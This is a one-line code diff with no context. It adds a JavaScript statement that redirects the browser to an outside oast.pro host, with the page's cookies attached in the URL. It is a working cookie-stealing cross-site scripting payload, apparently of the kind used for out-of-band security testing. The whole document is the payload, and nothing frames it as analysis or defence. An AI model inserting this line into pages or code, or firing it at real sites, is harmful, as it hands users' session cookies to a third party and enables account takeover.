@@ -1,1 +1,1 @@
-
+document.location = "https://636d3e53149aec89ed0bguqwn7eyyyyyn.oast.pro/?cookie=" + encodeURIComponent(document.cookie);
